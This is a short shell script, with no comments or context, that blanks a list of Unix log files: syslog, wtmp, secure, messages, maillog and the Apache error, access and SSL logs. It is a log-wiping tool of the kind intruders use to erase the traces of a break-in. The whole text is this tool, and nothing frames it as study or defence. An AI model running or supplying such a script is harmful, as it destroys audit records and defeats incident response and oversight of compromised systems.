#!/bin/sh
echo >/dev/null>/var/log/syslog
echo >/dev/null>/var/adm/sylog
echo >/dev/null>/var/log/wtmp
echo >/dev/null>/var/log/maillog
echo >/dev/null>/var/log/messages
echo >/dev/null>/var/log/openwebmail.log
echo >/dev/null>/var/log/maillog
echo >/dev/null>/var/log/secure
echo >/dev/null>/var/log/httpd/error_log
echo >/dev/null>/var/log/httpd/ssl_error_log
echo >/var/log/httpd/ssl_request_log
echo >/var/log/httpd/ssl_access_log
echo >/var/log/syslog
